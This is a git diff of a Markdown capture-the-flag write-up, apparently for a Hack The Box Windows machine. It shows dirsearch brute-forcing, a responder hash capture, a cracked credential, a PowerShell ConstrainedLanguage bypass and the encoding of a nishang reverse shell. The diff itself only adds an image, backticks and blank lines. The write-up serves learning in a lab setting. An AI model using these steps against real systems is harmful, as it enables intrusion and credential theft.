@@ -8,6 +8,8 @@ First we start as usual with running <emb>nmap</emb> to see open ports and servi
 The result shows a bunch of ports: 80, 443, 8080, 600x.
 
 
+<img src="/src/nmap1.png">
+
 We will start by ports 80 and 443, which only show a default windows IIS server default page. In this case we will launch a directory/files brute force to see if can find some juicy entries.
 
 <span style="color:blue"><emb>dirsearch.py -e php,html -u http://10.10.10.210/ -t 50 -w wordlist.txt</emb></span>
@@ -62,7 +64,7 @@ We set our responder as follow: <span style="color:blue"><emb>responder -I tun0 
 A few seconds later we got NTLMv2 hash for a k.svensson, and we launch hashcat to crack that hash: <span style="color:red">k.svensson:kittycat1</span>
 
 
-At this stage we will try to use this crendentials to execute powershell remoting, we had a problem of ConstrainedLanguage mode in that powershell session. To bypass this restriction we can create a function and call it, or we use the & sign to execute commands. So the following will execute whoami command: 
+At this stage we will try to use this crendentials to execute powershell remoting, we had a problem of ConstrainedLanguage mode in that powershell session. To bypass this restriction we can create a function and call it, or we use the & sign to execute commands. So the following will execute `whoami` command: 
 
 
 ```
@@ -77,6 +79,8 @@ htb\k.svensson
 
 Next we want to get a reverse shell on the box.
 We will use nishang and base64 encode it:
+
+
 <span style="color:blue"><emb>cat Invoke-PowershellTcpOnLine.ps1 | iconv -t utf16le | base64 -w 0</emb></span>
 
 
